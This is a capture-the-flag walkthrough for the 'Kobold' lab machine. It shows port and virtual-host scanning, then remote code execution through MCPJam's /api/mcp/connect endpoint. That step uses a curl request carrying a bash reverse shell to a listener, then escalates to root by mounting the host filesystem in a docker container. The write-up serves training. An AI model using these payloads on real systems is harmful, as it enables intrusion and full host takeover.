# Machine: Kobold (Linux - Easy)

## 1. Recon
- Port scanning
```
nmap -sC -sV -oA kobold 10.xxx.xx.xxx
```
Result:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Add domain **kobold.htb** to **/etc/hosts**
- Virtual host discovery using ffuf
```
ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w subdomains-top1million-5000.txt -fs 154
```
- Found 2 subdomains, **bin** and **mcp**. Add to **/etc/hosts**
- Subdomain **mcp** is MCPJam Version: v1.4.2, visible on settings page
- RCE via `/api/mcp/connect` endpoint

## 2. Gaining access
- Listener
```
nc -lnvp 9001
```
- Reverse shell
```
curl -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{"serverId": "exploit","serverConfig":{"command":"bash","args": ["-c", "sh -i >& /dev/tcp/10.10.xx.xx/9001 0>&1"],"env": {}}}' \
-k
```
- Upgrade shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 3. Privilege Escalation
```
ben@kobold:~$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```
- Group system process
```
ben@kobold:~$ systemctl list-units --type=service --state=running
  UNIT                      LOAD   ACTIVE SUB     DESCRIPTION                  >
  arcane.service            loaded active running Arcane Service
  auditd.service            loaded active running Security Auditing Service
  containerd.service        loaded active running containerd container runtime
  cron.service              loaded active running Regular background program pr>
  dbus.service              loaded active running D-Bus System Message Bus
  docker.service            loaded active running Docker Application Container >
  ...
```
- Operator group has permission to switch to the docker group
- Docker daemon run as root and listen on a socket at `/var/run/docker.sock`
- Who has r/w access to this socket can execute commands to Docker as root, including running containers that mount the host file system
```
ben@kobold:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Apr 10 02:09 /var/run/docker.sock
```
- Show running containers
```
ben@kobold:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied
```
- Add ourselves to the docker group
```
ben@kobold:~$ newgrp docker
```
- Show running containers
```
ben@kobold:~$ docker ps
CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS          PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   7 weeks ago   Up 26 minutes   127.0.0.1:8080->8080/tcp   bin
```
- Exploiting root
```
docker run -it -v /:/mnt --rm -u root --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2
```
- Break down:
  - `docker run`: run new container from an image.
  - `-i`: interactive
  - `-t`: TTY
  - `-v /:/mnt`: volume mount from `/` to `/mnt`
  - `--rm`: auto remove container after exit
  - `-u root`: force container to run as root user
  - `--entrypoint /bin/sh`: ignore the default image command (eg: start nginx) and immediately run the shell
  - `privatebin/nginx-fpm-alpine:2.0.2`: target image
- Take control the host
```
chroot /mnt /bin/bash
```
